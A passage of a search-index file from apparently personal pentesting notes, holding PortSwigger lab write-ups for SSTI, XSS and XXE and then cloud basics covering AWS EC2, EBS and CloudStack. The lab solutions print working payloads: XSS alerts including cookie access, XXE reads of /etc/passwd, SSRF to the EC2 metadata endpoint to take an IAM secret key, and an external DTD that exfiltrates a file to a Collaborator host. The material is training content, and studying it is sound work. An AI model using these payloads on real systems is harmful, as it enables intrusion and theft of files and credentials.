\n</code></pre>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#server-side-template-injection-with-information-disclosure-via-user-supplied-objects","title":"Server-side template injection with information disclosure via user-supplied objects","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#enunciation_4","title":"Enunciation","text":"<p>This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.</p> <p>To solve the lab, steal and submit the framework's secret key.</p> <p>You can log in to your own account using the following credentials:</p> <p><code>content-manager:C0nt3ntM4n4g3r</code></p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#solution_4","title":"Solution","text":"<p>Reading some documentation about settings in django documentation: https://docs.djangoproject.com/en/5.0/ref/settings/#secret-key</p> <p></p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#server-side-template-injection-in-a-sandboxed-environment","title":"Server-side template injection in a sandboxed environment","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#enunciation_5","title":"Enunciation","text":"<p>This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file\u00a0<code>my_password.txt</code>\u00a0from Carlos's home directory. Then submit the contents of the file.</p> <p>You can log in to your own account using the following credentials:</p> <p><code>content-manager:C0nt3ntM4n4g3r</code></p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#solution_5","title":"Solution","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#server-side-template-injection-with-a-custom-exploit","title":"Server-side template injection with a custom exploit","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#enunciation_6","title":"Enunciation","text":"<p>This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file\u00a0<code>/.ssh/id_rsa</code>\u00a0from Carlos's home directory.</p> <p>You can log in to your own account using the following credentials:\u00a0<code>wiener:peter</code></p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#warning","title":"Warning","text":"<p>As with many high-severity vulnerabilities, experimenting with server-side template injection can be dangerous. If you're not careful when invoking methods, it is possible to damage your instance of the lab, which could make it unsolvable. If this happens, you will need to wait 20 minutes until your lab session resets.</p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#solution_6","title":"Solution","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#server-side-template-injection-with-a-custom-exploit_1","title":"Server-side template injection with a custom exploit","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#enunciation_7","title":"Enunciation","text":"<p>This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file\u00a0<code>/.ssh/id_rsa</code>\u00a0from Carlos's home directory.</p> <p>You can log in to your own account using the following credentials:\u00a0<code>wiener:peter</code></p> <p>Warning</p> <p>As with many high-severity vulnerabilities, experimenting with server-side template injection can be dangerous. If you're not careful when invoking methods, it is possible to damage your instance of the lab, which could make it unsolvable. If this happens, you will need to wait 20 minutes until your lab session resets.</p>","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-ssti/#solution_7","title":"Solution","text":"","tags":["burpsuite","ssti"]},{"location":"burpsuite/burpsuite-xss/","title":"BurpSuite Labs - Cross-site Scripting","text":"","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#reflected-xss-into-html-context-with-nothing-encoded","title":"Reflected XSS into HTML context with nothing encoded","text":"","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#enuntiation","title":"Enuntiation","text":"<p>This lab contains a simple\u00a0reflected cross-site scripting\u00a0vulnerability in the search functionality.</p> <p>To solve the lab, perform a cross-site scripting attack that calls the\u00a0<code>alert</code>\u00a0function.</p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#solution","title":"Solution","text":"<p>Copy and paste the following into the search box: </p> <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre> <p>Click Search.</p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#stored-xss-into-html-context-with-nothing-encoded","title":"Stored XSS into HTML context with nothing encoded","text":"","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#enuntiation_1","title":"Enuntiation","text":"<p>This lab contains a\u00a0stored cross-site scripting\u00a0vulnerability in the comment functionality.</p> <p>To solve this lab, submit a comment that calls the\u00a0<code>alert</code>\u00a0function when the blog post is viewed.</p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#solution_1","title":"Solution","text":"<p>Go to a post, and in the comment box enter:</p> <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre> <p>Once you go back to the post, the script will be load.</p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#dom-xss-in-documentwrite-sink-using-source","title":"DOM XSS in\u00a0document.write\u00a0sink using source","text":"","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#enuntiation_2","title":"Enuntiation","text":"<p>This lab contains a\u00a0DOM-based cross-site scripting\u00a0vulnerability in the search query tracking functionality. It uses the JavaScript\u00a0<code>document.write</code>\u00a0function, which writes data out to the page. The\u00a0<code>document.write</code>\u00a0function is called with data from\u00a0<code>location.search</code>, which you can control using the website URL.</p> <p>To solve this lab, perform a\u00a0cross-site scripting\u00a0attack that calls the\u00a0<code>alert</code>\u00a0function.</p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#solution_2","title":"Solution","text":"<p>Use the searchbox lo look for some alphanumeric characters and see in the response where those characters have been reflected. In this case, it was in an image:</p> <p></p> <p>Now, escape those characters. For instance with:</p> <pre><code>\"&gt;&lt;SCRIPT&gt;alert(1)&lt;/sCripT&gt;\n</code></pre>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#dom-xss-in-innerhtml-sink-using-source","title":"DOM XSS in\u00a0innerHTML\u00a0sink using source","text":"","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#enuntiation_3","title":"Enuntiation","text":"<p>This lab contains a\u00a0DOM-based cross-site scripting\u00a0vulnerability in the search blog functionality. It uses an\u00a0<code>innerHTML</code>\u00a0assignment, which changes the HTML contents of a\u00a0<code>div</code>\u00a0element, using data from\u00a0<code>location.search</code>.</p> <p>To solve this lab, perform a\u00a0cross-site scripting\u00a0attack that calls the\u00a0<code>alert</code>\u00a0function.</p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#solution_3","title":"Solution","text":"<p>Reviewing my notes, if we're looking for a DOM based XSS a good proof of concept would be: swisskyrepo/PayloadsAllTheThings</p> <p>An extensive XSS payload list can be used from Payloadbox but It's hard to tell which one is a positive and for this lab you will end up with a list of 124 possible payloads.</p> <p>To solve the lab, enter in the searchbox:  <pre><code>#\"&gt;&lt;img src=/ onerror=alert(2)&gt;\n</code></pre></p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source","title":"DOM XSS in jQuery anchor\u00a0href\u00a0attribute sink using\u00a0location.search\u00a0source","text":"","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#enuntiation_4","title":"Enuntiation","text":"<p>This lab contains a\u00a0DOM-based cross-site scripting\u00a0vulnerability in the submit feedback page. It uses the jQuery library's\u00a0<code>$</code>\u00a0selector function to find an anchor element, and changes its\u00a0<code>href</code>\u00a0attribute using data from\u00a0<code>location.search</code>.</p> <p>To solve this lab, make the \"back\" link alert\u00a0<code>document.cookie</code>.</p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#solution_4","title":"Solution","text":"<p>In home page, pay attention to the link in \"\u00a0Submit feedback\". In home is pointing to \"/feedback?returnpath=/. </p> <p></p> <p>Edit source code and add to the parameter  <code>javascript:alert(document.cookie)</code> so that the final href attribute is:</p> <pre><code>/feedback?returnpath=/javascript:alert(document.cookie)\n</code></pre> <p>Click on Submit feedback.</p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#dom-xss-in-jquery-selector-sink-using-a-hashchange-event","title":"DOM XSS in jQuery selector sink using a hashchange event","text":"","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#enuntiation_5","title":"Enuntiation","text":"<p>This lab contains a\u00a0DOM-based cross-site scripting\u00a0vulnerability on the home page. It uses jQuery's\u00a0<code>$()</code>\u00a0selector function to auto-scroll to a given post, whose title is passed via the\u00a0<code>location.hash</code>\u00a0property.</p> <p>To solve the lab, deliver an exploit to the victim that calls the\u00a0<code>print()</code>\u00a0function in their browser.</p>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xss/#solution_5","title":"Solution","text":"<p>Copied from Burpsuite:</p> <ol> <li>Notice the vulnerable code on the home page using Burp or the browser's DevTools.</li> <li>From the lab banner, open the exploit server.</li> <li> <p>In the\u00a0Body\u00a0section, add the following malicious\u00a0<code>iframe</code>:</p> <p><code>&lt;iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/#\" onload=\"this.src+='&lt;img src=x onerror=print()&gt;'\"&gt;&lt;/iframe&gt;</code> 4.  Store the exploit, then click\u00a0View exploit\u00a0to confirm that the\u00a0<code>print()</code>\u00a0function is called. 5.  Go back to the exploit server and click\u00a0Deliver to victim\u00a0to solve the lab</p> </li> </ol>","tags":["burpsuite","xss"]},{"location":"burpsuite/burpsuite-xxe/","title":"BurpSuite Labs - XML External Entity XXE","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#exploiting-xxe-using-external-entities-to-retrieve-files","title":"Exploiting XXE using external entities to retrieve files","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#enunciation","title":"Enunciation","text":"<p>This lab has a \"Check stock\" feature that parses XML input and returns any unexpected values in the response.</p> <p>To solve the lab, inject an XML external entity to retrieve the contents of the <code>/etc/passwd</code> file.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#solution","title":"Solution","text":"<pre><code># Burpsuite solution\n\n1. Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:\n\n    `&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;`\n3. Replace the `productId` number with a reference to the external entity: `&amp;xxe;`. The response should contain \"Invalid product ID:\" followed by the contents of the `/etc/passwd` file.\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#exploiting-xxe-to-perform-ssrf-attacks","title":"Exploiting XXE to perform SSRF attacks","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#enunciation_1","title":"Enunciation","text":"<p>This lab has a \"Check stock\" feature that parses XML input and returns any unexpected values in the response.</p> <p>The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is <code>http://169.254.169.254/</code>. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.</p> <p>To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#solution_1","title":"Solution","text":"<p>Capture the check stock request:</p> <p></p> <p>Perfom the data exfiltration chaining xxe y ssrf. The response will display the next folder that needs to be added to the request:</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <pre><code># Burpsuite solution\n1. Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:\n\n    `&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"http://169.254.169.254/\"&gt; ]&gt;`\n3. Replace the `productId` number with a reference to the external entity: `&amp;xxe;`. The response should contain \"Invalid product ID:\" followed by the response from the metadata endpoint, which will initially be a folder name.\n4. Iteratively update the URL in the DTD to explore the API until you reach `/latest/meta-data/iam/security-credentials/admin`. This should return JSON containing the `SecretAccessKey`.\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#blind-xxe-with-out-of-band-interaction","title":"Blind XXE with out-of-band interaction","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#enunciation_2","title":"Enunciation","text":"<p>This lab has a \"Check stock\" feature that parses XML input but does not display the result.</p> <p>You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.</p> <p>To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#solution_2","title":"Solution","text":"<pre><code># Burpsuite solution\n1. Visit a product page, click \"Check stock\" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).\n2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated:\n\n    `&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"&gt; ]&gt;`\n3. Replace the `productId` number with a reference to the external entity:\n\n    `&amp;xxe;`\n4. Go to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities","title":"Blind XXE with out-of-band interaction via XML parameter entities","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#enunciation_3","title":"Enunciation","text":"<p>This lab has a \"Check stock\" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.</p> <p>To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#note","title":"Note","text":"<p>To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#solution_3","title":"Solution","text":"<pre><code>1. Visit a product page, click \"Check stock\" and intercept the resulting POST request in [Burp Suite Professional](https://portswigger.net/burp/pro).\n2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated:\n\n    `&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN\"&gt; %xxe; ]&gt;`\n3. Go to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd","title":"Exploiting blind XXE to exfiltrate data using a malicious external DTD","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#enunciation_4","title":"Enunciation","text":"<p>This lab has a \"Check stock\" feature that parses XML input but does not display the result.</p> <p>To solve the lab, exfiltrate the contents of the <code>/etc/hostname</code> file.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#solution_4","title":"Solution","text":"<pre><code># Burpsuite solution\n1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.\n2. Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.\n3. Place the Burp Collaborator payload into a malicious DTD file:\n\n    `&lt;!ENTITY % file SYSTEM \"file:///etc/hostname\"&gt; &lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'&gt;\"&gt; %eval; %exfil;`\n4. Click \"Go to exploit server\" and save the malicious DTD file on your server. Click \"View exploit\" and take a note of the URL.\n5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n6. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:\n\n    `&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"&gt; %xxe;]&gt;`\n7. Go back to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again.\n8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the `/etc/hostname` file.\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#exploiting-blind-xxe-to-retrieve-data-via-error-messages","title":"Exploiting blind XXE to retrieve data via error messages","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#enunciation_5","title":"Enunciation","text":"<p>This lab has a \"Check stock\" feature that parses XML input but does not display the result.</p> <p>To solve the lab, use an external DTD to trigger an error message that displays the contents of the <code>/etc/passwd</code> file.</p> <p>The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#solution_5","title":"Solution","text":"<pre><code># Burpsuite solution\n\n1. Click \"Go to exploit server\" and save the following malicious DTD file on your server:\n\n    `&lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt; &lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;\"&gt; %eval; %exfil;`\n\n    When imported, this page will read the contents of `/etc/passwd` into the `file` entity, and then try to use that entity in a file path.\n\n2. Click \"View exploit\" and take a note of the URL for your malicious DTD.\n3. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n4. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:\n\n    `&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \"YOUR-DTD-URL\"&gt; %xxe;]&gt;`\n\n    You should see an error message containing the contents of the `/etc/passwd` file.\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#exploiting-xinclude-to-retrieve-files","title":"Exploiting XInclude to retrieve files","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#enunciation_6","title":"Enunciation","text":"<p>This lab has a \"Check stock\" feature that embeds the user input inside a server-side XML document that is subsequently parsed.</p> <p>Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.</p> <p>To solve the lab, inject an <code>XInclude</code> statement to retrieve the contents of the <code>/etc/passwd</code> file.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#solution_6","title":"Solution","text":"<pre><code># Burpsuite solution\n\n1. Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n2. Set the value of the `productId` parameter to:\n\n    `&lt;foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt;&lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/&gt;&lt;/foo&gt;`\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#exploiting-xxe-via-image-file-upload","title":"Exploiting XXE via image file upload","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#enunciation_7","title":"Enunciation","text":"<p>This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.</p> <p>To solve the lab, upload an image that displays the contents of the <code>/etc/hostname</code> file after processing. Then use the \"Submit solution\" button to submit the value of the server hostname.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#solution_7","title":"Solution","text":"<p>Afterwards, retrieve the avatar image:</p> <p></p> <pre><code># Burpsuite solution\n\n- reate a local SVG image with the following content:\n\n    `&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" &gt; ]&gt;&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"&gt;&lt;text font-size=\"16\" x=\"0\" y=\"16\"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;`\n- Post a comment on a blog post, and upload this image as an avatar.\n- When you view your comment, you should see the contents of the `/etc/hostname` file in your image. Use the \"Submit solution\" button to submit the value of the server hostname.\n</code></pre> <p>Payload:</p> <pre><code>&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" &gt; ]&gt;&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"&gt;&lt;text font-size=\"16\" x=\"0\" y=\"16\"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd","title":"Exploiting XXE to retrieve data by repurposing a local DTD","text":"","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#enunciation_8","title":"Enunciation","text":"<p>This lab has a \"Check stock\" feature that parses XML input but does not display the result.</p> <p>To solve the lab, trigger an error message containing the contents of the <code>/etc/passwd</code> file.</p> <p>You'll need to reference an existing DTD file on the server and redefine an entity from it.</p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#hint","title":"Hint","text":"<p>Systems using the GNOME desktop environment often have a DTD at <code>/usr/share/yelp/dtd/docbookx.dtd</code> containing an entity called <code>ISOamso.</code></p>","tags":["burpsuite","jwt"]},{"location":"burpsuite/burpsuite-xxe/#solution_8","title":"Solution","text":"<pre><code># Burpsuite solution\n\n1. Visit a product page, click \"Check stock\", and intercept the resulting POST request in Burp Suite.\n2. Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:\n\n    `&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"&gt; &lt;!ENTITY % ISOamso ' &lt;!ENTITY &amp;#x25; file SYSTEM \"file:///etc/passwd\"&gt; &lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;\"&gt; &amp;#x25;eval; &amp;#x25;error; '&gt; %local_dtd; ]&gt;` This will import the Yelp DTD, then redefine the `ISOamso` entity, triggering an error message containing the contents of the `/etc/passwd` file.\n</code></pre>","tags":["burpsuite","jwt"]},{"location":"cloud/","title":"Pentesting cloud","text":"","tags":["cloud pentesting"]},{"location":"cloud/#basics-about-cloud","title":"Basics about cloud","text":"<p>There are many \"clouds\". But these three cloud providers are the big three players in the market:</p> <ul> <li>Azure: Fundamentals | Security Engineer Level.</li> <li>Amazon Web Service (AWS): AWS essentials</li> <li>Google Cloud: GCP essentials</li> </ul>","tags":["cloud pentesting"]},{"location":"cloud/#cloud-services-matrix","title":"Cloud services matrix","text":"Azure AWS GCP Available Regions Azure Regions AWS Regions and Zones Google Compute Regions &amp; Zones Compute Services Virtual Machines Elastic Compute Cloud (EC2) Compute Engine App Hosting Azure App Service Amazon Elastic Beanstalk Google App Engine Serverless Computing Azure Functions AWS Lambda Google Cloud Functions Container Support Azure Container Service EC2 Container Service Google Computer Engine (GCE) Scaling Options Azure Autoscale Auto Scaling Autoscaler Object Storage Azure Blob Storage Amazon Simple Storage (S3) Google Cloud Storage Block Storage Azure Disks Amazon Elastic Block Store Persistent Disk Content Delivery Network (CDN) Azure CDN Amazon CloudFront Cloud CDN SQL Database Options Azure SQL Database Amazon RDS Google Cloud SQL NoSQL Database Options Azure CosmosDB AWS DynamoDB Google Cloud Bigtable Virtual Network Azure Virtual Network Amazon VPC Cloud Virtual Network Private Connectivity Azure ExpressRoute AWS Direct Connect Cloud Interconnect DNS Services Azure DNS Amazon Route S3 Cloud DNS Log Monitoring Azure Log Analytics Amazon CloudTrail Cloud Logging Performance Monitoring Azure Application Insights Amazon CloudWatch Stackdriver Monitoring Administration and Security Azure Entra ID AWS Identity and Access Management Cloud Identity and Access Management Compliance Azure Trust Center AWS CloudHSM Google Cloud Platform Security Analytics Azure Monitor Amazon Kinesis Cloud Dataflow Automation Azure Automation AWS Opsworks Compute Engine Management Management Services &amp; Options Azure Resource Manager Amazon Cloudformation Cloud Deployment Manager Notifications Azure Notification Hub Amazon Simple Notification Service (SNS) None Load Balancing Load Balancing for Azure Elastic Load Balancing Load Balancer","tags":["cloud pentesting"]},{"location":"cloud/#pentesting-cloud_1","title":"Pentesting cloud","text":"<ul> <li>Pentesting Azure.</li> <li>Pentesting AWS.</li> <li>Pentesting docker.</li> </ul>","tags":["cloud pentesting"]},{"location":"cloud/apache-cloudstack/apache-cloudstack-essentials/","title":"Apache CloudStack Essentials","text":"<p>Apache CloudStack is open source software designed to deploy and manage large networks of virtual machines, as a highly available, highly scalable Infrastructure as a Service (IaaS) cloud computing platform.</p> <p>Cloudstack is a turnkey solution that includes the entire stack of features most organizations want with an IIS cloud.</p> <p>We talk here about compute orchestration network as a service user and account management, a full and open native API resource accounting and a first class user interface UI. Cloudstack currently supports the most popular hypervisor, VMware KVM, Citrix, Xenserver, Xen Cloud Platform, Oracle VM Server and Microsoft Hyper-V.</p> <p>Users can manage their cloud with an easy to use web interface, command line tools and or a full featured restful API.</p> <p>In addition, Cloudstack provides an API that that is compatible with the Amazon Web service EC2 and S3.</p> <ul> <li>For organizations that wish to deploy hybrid clouds.</li> <li>Similar to OpenStack dashboard via the cloud stack dashboard.</li> <li>You can manage all your resources.</li> </ul> <p>Link to installation: https://docs.cloudstack.apache.org/en/4.18.0.0/installguide/overview/index.html</p>","tags":["cloud","apache cloudstack","open source"]},{"location":"cloud/aws/aws-essentials/","title":"Amazon Web Services (AWS) Essentials","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-compute","title":"AWS Compute","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#elastic-computer-cloud-ec2","title":"Elastic Computer Cloud (EC2)","text":"<p>An EC2 instance is a Virtual Server running on AWS. You deploy your EC2 instances into a virtual private cloud or VPC. You can deploy them into public or private subnets.</p> <p>You can choose: OS, CPU, RAM, Storage space, network card, firewall rules (security group), and bootstrap script (configure at fisrt launch, and which is called EC2 User Data). Concept of bootstrap: bootstrapping means launching commands when a machine starts. That script is only run once, at first start. You can: install updates, software, common files from the internet,...</p> <p>Public subnets have a public IP address and can be accessed from the Internet. Private subnets are isolated. They can only communicate with each other within the VPC (unless you install a gateway.</p> <p>Some instance types: t2.micro, t2.xlarge, c5d.4xlarge, r516xlarge, m5.8xlarge,... t2.micro is part of the AWS free tier with up to 750 hours per month. This is the name convention for instances:</p> <pre><code>m5.2xlarge\n# m: instance class\n# 5: generation of the instance \n# 2xlarge: size within the instance class\n</code></pre> <p>There are general purpose instances, storage optimized, network optimized, or memory optimized, for instance.</p> <p>The security groups only have allow rules (because the default is deny).By default, all inbound traffic is blocked and all outbound traffic is authorized. An instance can have multiple security groups. You can attach to your firewall rules security groups. </p> <p>Default user for connecting to EC2 via ssh is ec2-user. So ssh connection would be:</p> <pre><code>ssh -i access-key.pem ec2-user@&lt;IP&gt;\n</code></pre>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#ami","title":"AMI","text":"<p>AMI stands for Amazon Machine Image and they represent a customization of an EC2 instance. It's similar to the concept of OVA in VirtualBox.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#ec2-image-builder","title":"EC2 Image Builder","text":"<p>EC2 Image Builder is used to automate the creation of VM or container images. It automates the creation, maintain, validate, and test EC2 AMIs. It can be run on a schedule. It's a free service.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#aws-storage","title":"AWS Storage","text":"","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#amazon-elastic-block-store-ebs","title":"Amazon Elastic Block Store (EBS)","text":"<p>Block Storage Device, it's a virtual hard drive in the cloud. The OS reads/writes at the block level. Disks can be internal, or Network attached. The OS sees volumes that can be partitioned and formatted. Use cases:</p> <ul> <li>Use by Amazon EC2 instances.</li> <li>Relational and non-relational databases.</li> <li>Enterprises applications.</li> <li>Containerized applications.</li> <li>Big data analytics.</li> <li>File systems.</li> </ul> <p>The free tier has 30GB of free EBS storage of type General Purpose (SSD) or Magnetic per month. </p> <p>A definition for EBS would be that they are network drives (not physical drives). They use the network to communicate the instance. They can be detached from an EC2 instance and attached to another very quickly. They are locked to an Availability Zone. </p> <p>They don't need to be attached to any instance. They have also a delete on termination attribute. By default is not deleted. This feature can be triggered from aws-cli.</p>","tags":["cloud","aws","amazon web services","public cloud"]},{"location":"cloud/aws/aws-essentials/#ebs-snapshots","title":"EBS Snapshots","text":"<p>It makes a backup (snapshot) of your EBS volume at a point in time. Not necessary to detach volume to do snapshot, but recommended. Snapshot are useful to replicate EBS in different regions. By copying snapshot to a different region you can migrate EBS attached to another in a different region.</p> <p>There is a EBS Snapshot Archive service, that allows you to move a snapshot to an archive tier that is 75% 